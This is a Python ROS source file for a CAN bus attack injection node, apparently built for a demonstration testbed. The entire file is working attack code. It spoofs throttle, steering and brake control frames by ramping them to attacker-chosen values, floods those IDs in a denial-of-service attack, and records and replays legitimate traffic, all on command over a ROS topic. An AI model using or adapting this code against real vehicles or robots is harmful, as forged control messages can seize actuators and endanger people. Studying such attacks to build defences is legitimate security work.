#!/usr/bin/env python3

import json
import math
import threading
import time
from collections import deque

import can
import rospy
from can_msgs.msg import Frame
from std_msgs.msg import String


class AttackInjectionNode:
    CONTROL_IDS = (0x100, 0x101, 0x102)

    def __init__(self):
        rospy.init_node('attack_injection_node', anonymous=True)

        self.channel = rospy.get_param('~channel', 'can0')
        self.bustype = rospy.get_param('~bustype', 'socketcan')
        self.bitrate = int(rospy.get_param('~bitrate', 500000))

        self.capture_limit = int(rospy.get_param('~capture_limit', 3000))

        # Demo defaults
        self.default_rate_hz = float(rospy.get_param('~default_rate_hz', 300.0))
        self.default_spoof_duration = float(rospy.get_param('~default_spoof_duration', 4.0))
        self.default_spoof_message_count = int(rospy.get_param('~default_spoof_message_count', 1200))

        self.default_dos_duration = float(rospy.get_param('~default_dos_duration', 5.0))
        self.default_dos_message_count = int(rospy.get_param('~default_dos_message_count', 2000))

        self.default_replay_record_duration = float(rospy.get_param('~default_replay_record_duration', 5.0))
        self.default_replay_count = int(rospy.get_param('~replay_count', 1))

        self.bus = None
        self.attack_thread = None
        self.attack_stop = threading.Event()

        self.capture_buffer = deque(maxlen=self.capture_limit)
        self.capture_lock = threading.Lock()
        self.latest_legit_values = {0x100: 0, 0x101: 127, 0x102: 0}

        # Replay recording/playback
        self.replay_recording_active = False
        self.replay_record_end_time = 0.0
        self.replay_recorded_frames = []
        self.replay_record_start_time = None
        self.replay_lock = threading.Lock()

        self.attack_sub = rospy.Subscriber('/attack_command', String, self.attack_command_callback, queue_size=20)
        self.can_rx_sub = rospy.Subscriber('/can_rx', Frame, self.can_rx_callback, queue_size=300)

        self.status_pub = rospy.Publisher('/attack_status', String, queue_size=50)
        self.can_tx_pub = rospy.Publisher('/can_tx', Frame, queue_size=500)

        self._connect_bus()
        rospy.loginfo('Attack node ready (replay record/play enabled)')

    def _connect_bus(self):
        if self.bustype == 'socketcan':
            self.bus = can.interface.Bus(channel=self.channel, bustype=self.bustype)
        else:
            self.bus = can.interface.Bus(channel=self.channel, bustype=self.bustype, bitrate=self.bitrate)

    def can_rx_callback(self, msg):
        frame_id = int(msg.id)
        if frame_id not in self.CONTROL_IDS:
            return

        data = list(msg.data[:msg.dlc]) if msg.dlc else list(msg.data)
        while len(data) < 8:
            data.append(0)
        data = [int(x) & 0xFF for x in data[:8]]
        value = data[0]
        self.latest_legit_values[frame_id] = value

        now = time.time()
        with self.capture_lock:
            self.capture_buffer.append({
                'id': frame_id,
                'data': data,
                'timestamp': now,
            })

        # Record replay frames if recording is active
        with self.replay_lock:
            if self.replay_recording_active:
                if now <= self.replay_record_end_time:
                    if self.replay_record_start_time is None:
                        self.replay_record_start_time = now
                    self.replay_recorded_frames.append({
                        'id': frame_id,
                        'data': data,
                        'offset': now - self.replay_record_start_time,
                    })
                else:
                    self._finish_replay_record_locked()

    def attack_command_callback(self, msg):
        try:
            payload = json.loads(msg.data)
        except Exception as exc:
            self.publish_status('error', {'error': 'Invalid attack JSON: %s' % exc})
            return

        attack_type = str(payload.get('type', '')).strip().lower()

        if attack_type in ('stop', 'cancel'):
            self.stop_active_attack()
            self.publish_status('cancelled', {'reason': 'user_request'})
            return

        # Replay record/play commands
        if attack_type in ('replay_record', 'record_replay', 'record'):
            duration = float(payload.get('duration', self.default_replay_record_duration))
            self.start_replay_record(duration)
            return

        if attack_type in ('replay_play', 'play_replay', 'replay'):
            repeat_count = int(payload.get('repeat_count', self.default_replay_count))
            self.stop_active_attack()
            self.attack_stop.clear()
            self.attack_thread = threading.Thread(
                target=self.run_replay_play,
                args=(repeat_count,),
                daemon=True
            )
            self.attack_thread.start()
            return

        value = int(payload.get('value', 255))
        repeat_count = int(payload.get('repeat_count', self.default_replay_count))

        if attack_type not in ('throttle', 'steering', 'brake', 'dos'):
            self.publish_status('error', {'error': 'Unknown attack type: %s' % attack_type})
            return

        if attack_type == 'dos':
            duration = float(payload.get('duration', self.default_dos_duration))
            message_count = int(payload.get('message_count', self.default_dos_message_count))
            rate_hz = float(payload.get('rate_hz', 0.0))
        else:
            duration = float(payload.get('duration', self.default_spoof_duration))
            message_count = int(payload.get('message_count', self.default_spoof_message_count))
            rate_hz = float(payload.get('rate_hz', self.default_rate_hz))

        self.stop_active_attack()
        self.attack_stop.clear()
        self.attack_thread = threading.Thread(
            target=self.run_attack,
            args=(attack_type, value, duration, rate_hz, repeat_count, message_count),
            daemon=True
        )
        self.attack_thread.start()

    def start_replay_record(self, duration):
        with self.replay_lock:
            self.replay_recording_active = True
            self.replay_record_end_time = time.time() + max(duration, 0.1)
            self.replay_recorded_frames = []
            self.replay_record_start_time = None

        self.publish_status('recording_started', {
            'type': 'replay_record',
            'duration': duration,
        })

    def _finish_replay_record_locked(self):
        frames_captured = len(self.replay_recorded_frames)
        self.replay_recording_active = False
        self.replay_record_end_time = 0.0
        self.replay_record_start_time = None

        self.publish_status('recording_finished', {
            'type': 'replay_record',
            'frames_captured': frames_captured,
        })

    def stop_active_attack(self):
        self.attack_stop.set()
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1.0)
        self.attack_thread = None
        self.attack_stop.clear()

    def run_attack(self, attack_type, value, duration, rate_hz, repeat_count, message_count):
        self.publish_status('started', {
            'type': attack_type,
            'value': value,
            'duration': duration,
            'rate_hz': rate_hz,
            'repeat_count': repeat_count,
            'message_count': message_count,
        })

        try:
            if attack_type == 'throttle':
                self.ramp_attack(0x100, value, duration, rate_hz, message_count)
            elif attack_type == 'steering':
                self.ramp_attack(0x101, value, duration, rate_hz, message_count)
            elif attack_type == 'brake':
                self.ramp_attack(0x102, value, duration, rate_hz, message_count)
            elif attack_type == 'dos':
                self.dos_attack(duration, message_count)

            self.publish_status('finished', {'type': attack_type})
        except Exception as exc:
            rospy.logerr('Attack failed: %s', exc)
            self.publish_status('error', {'type': attack_type, 'error': str(exc)})

    def run_replay_play(self, repeat_count):
        with self.replay_lock:
            frames = list(self.replay_recorded_frames)

        if len(frames) < 5:
            self.publish_status('error', {'type': 'replay_play', 'error': 'No recorded replay sequence available'})
            return

        self.publish_status('started', {
            'type': 'replay_play',
            'repeat_count': repeat_count,
            'frames_to_play': len(frames),
        })

        try:
            for _ in range(max(1, repeat_count)):
                previous_offset = 0.0
                for frame in frames:
                    if self.attack_stop.is_set():
                        return
                    offset = float(frame['offset'])
                    sleep_for = max(offset - previous_offset, 0.0)
                    if sleep_for > 0:
                        time.sleep(min(sleep_for, 0.08))
                    self.send_frame(frame['id'], frame['data'])
                    previous_offset = offset

            self.publish_status('finished', {
                'type': 'replay_play',
                'frames_played': len(frames),
            })
        except Exception as exc:
            rospy.logerr('Replay play failed: %s', exc)
            self.publish_status('error', {'type': 'replay_play', 'error': str(exc)})

    def ramp_attack(self, can_id, target, duration, rate_hz, message_count):
        start = int(self.latest_legit_values.get(can_id, 0))
        target = max(0, min(255, int(target)))

        if message_count > 0:
            steps = max(10, int(message_count))
            sleep_time = max(duration / float(steps), 0.0005)
        else:
            steps = max(10, int(max(duration, 0.2) * max(rate_hz, 60.0)))
            sleep_time = max(duration / float(steps), 0.0005)

        for i in range(steps):
            if self.attack_stop.is_set():
                return

            t = i / max(steps - 1, 1)
            if t < 0.15:
                eased = 0.5 - 0.5 * math.cos((t / 0.15) * math.pi)
                value = int(start + (target - start) * eased)
            else:
                value = target

            self.send_value(can_id, value)
            time.sleep(sleep_time)

    def dos_attack(self, duration, message_count):
        total_messages = max(1, int(message_count))
        sleep_time = max(duration / float(total_messages), 0.0005)

        for seq in range(total_messages):
            if self.attack_stop.is_set():
                return

            arbitration_id = self.CONTROL_IDS[seq % len(self.CONTROL_IDS)]

            if arbitration_id == 0x100:
                value = max(0, min(255, 235 + (seq % 21)))
            elif arbitration_id == 0x101:
                value = max(0, min(255, 127 + (((seq % 12) - 6) * 18)))
            else:
                value = max(0, min(255, 235 + ((seq // 2) % 21)))

            self.send_value(arbitration_id, value)
            time.sleep(sleep_time)

    def send_value(self, can_id, value):
        self.send_frame(can_id, [int(value) & 0xFF, 0, 0, 0, 0, 0, 0, 0])

    def send_frame(self, can_id, data):
        payload = [int(x) & 0xFF for x in list(data)[:8]]
        while len(payload) < 8:
            payload.append(0)

        msg = can.Message(arbitration_id=int(can_id), data=payload, is_extended_id=False)
        self.bus.send(msg)

        ros_msg = Frame()
        ros_msg.id = int(can_id)
        ros_msg.dlc = 8
        ros_msg.data = payload
        self.can_tx_pub.publish(ros_msg)

    def publish_status(self, state, extra=None):
        payload = {'state': state, 'timestamp': time.time()}
        if extra:
            payload.update(extra)
        self.status_pub.publish(String(data=json.dumps(payload)))

    def shutdown(self):
        self.stop_active_attack()
        if self.bus:
            try:
                self.bus.shutdown()
            except Exception:
                pass


if __name__ == '__main__':
    node = None
    try:
        node = AttackInjectionNode()
        rospy.on_shutdown(node.shutdown)
        rospy.spin()
    except rospy.ROSInterruptException:
        pass
    finally:
        if node is not None:
            node.shutdown()
